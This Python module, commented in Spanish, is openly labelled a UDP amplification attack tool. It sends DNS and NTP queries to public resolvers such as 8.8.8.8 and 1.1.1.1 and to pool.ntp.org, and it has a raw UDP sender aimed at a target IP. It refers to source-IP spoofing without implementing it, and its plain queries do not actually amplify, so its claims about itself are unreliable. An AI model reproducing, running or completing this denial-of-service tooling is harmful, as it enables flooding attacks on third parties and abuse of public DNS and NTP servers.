#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UDP-Amplification Attack Module
Explota servidores DNS/NTP para amplificar tráfico
"""

import socket
import random
import struct


class UDPAmplification:
    """Implementa ataque UDP-Amplification"""

    # Servidores DNS públicos para amplificación
    DNS_SERVERS = [
        '8.8.8.8',
        '8.8.4.4',
        '1.1.1.1',
        '1.0.0.1',
        '208.67.222.222',
        '208.67.220.220',
    ]

    # Servidores NTP públicos
    NTP_SERVERS = [
        '0.pool.ntp.org',
        '1.pool.ntp.org',
        '2.pool.ntp.org',
        '3.pool.ntp.org',
    ]

    def __init__(self, target, port=53, amplifier_type='dns'):
        """
        Inicializa el ataque UDP-Amplification
        
        Args:
            target: IP objetivo
            port: Puerto objetivo (default 53 para DNS)
            amplifier_type: 'dns' o 'ntp' (default 'dns')
        """
        self.target = target
        self.port = port
        self.amplifier_type = amplifier_type
        self.timeout = 2

    def _build_dns_query(self, domain='example.com'):
        """Construye una consulta DNS"""
        # Encabezado DNS
        transaction_id = random.randint(0, 65535)
        flags = 0x0100  # Standard query
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0

        header = struct.pack(
            '!HHHHHH',
            transaction_id,
            flags,
            questions,
            answer_rrs,
            authority_rrs,
            additional_rrs
        )

        # Pregunta
        qname = self._encode_domain_name(domain)
        qtype = 1  # A record
        qclass = 1  # IN

        question = qname + struct.pack('!HH', qtype, qclass)

        return header + question

    def _encode_domain_name(self, domain):
        """Codifica un nombre de dominio en formato DNS"""
        encoded = b''
        for label in domain.split('.'):
            encoded += bytes([len(label)]) + label.encode()
        encoded += b'\x00'
        return encoded

    def _build_ntp_query(self):
        """Construye una consulta NTP"""
        # NTP packet structure
        # Byte 0: LI (2 bits) + VN (3 bits) + Mode (3 bits)
        # LI = 0, VN = 3, Mode = 3 (client)
        
        ntp_packet = bytearray(48)
        ntp_packet[0] = 0x1b  # LI=0, VN=3, Mode=3
        
        # Timestamp (8 bytes) - current time
        import time
        timestamp = int((time.time() + 2208988800) * 65536)
        ntp_packet[40:48] = struct.pack('!Q', timestamp)
        
        return bytes(ntp_packet)

    def send_amplified_packet(self, amplifier=None):
        """
        Envía un paquete de amplificación
        
        Args:
            amplifier: IP del servidor amplificador (default aleatorio)
        """
        try:
            if amplifier is None:
                if self.amplifier_type == 'dns':
                    amplifier = random.choice(self.DNS_SERVERS)
                else:
                    amplifier = random.choice(self.NTP_SERVERS)

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)

            # Construir paquete
            if self.amplifier_type == 'dns':
                packet = self._build_dns_query()
                port = 53
            else:
                packet = self._build_ntp_query()
                port = 123

            # Enviar con IP origen spoofed (si es posible)
            # Nota: El spoofing real requiere permisos especiales
            sock.sendto(packet, (amplifier, port))
            sock.close()

            return True

        except socket.timeout:
            return False
        except Exception as e:
            raise Exception(f"Error en UDP-Amplification: {e}")

    def send_dns_amplification(self, domain='example.com'):
        """Envía amplificación DNS específica"""
        try:
            amplifier = random.choice(self.DNS_SERVERS)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)

            packet = self._build_dns_query(domain)
            sock.sendto(packet, (amplifier, 53))
            sock.close()

            return True

        except Exception as e:
            raise Exception(f"Error en DNS-Amplification: {e}")

    def send_ntp_amplification(self):
        """Envía amplificación NTP específica"""
        try:
            amplifier = random.choice(self.NTP_SERVERS)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)

            packet = self._build_ntp_query()
            sock.sendto(packet, (amplifier, 123))
            sock.close()

            return True

        except Exception as e:
            raise Exception(f"Error en NTP-Amplification: {e}")

    def send_raw_udp(self, data, target_port=None):
        """
        Envía un paquete UDP crudo
        
        Args:
            data: Datos a enviar
            target_port: Puerto destino (default self.port)
        """
        try:
            if target_port is None:
                target_port = self.port

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)

            sock.sendto(data.encode() if isinstance(data, str) else data, 
                       (self.target, target_port))
            sock.close()

            return True

        except Exception as e:
            raise Exception(f"Error en UDP crudo: {e}")
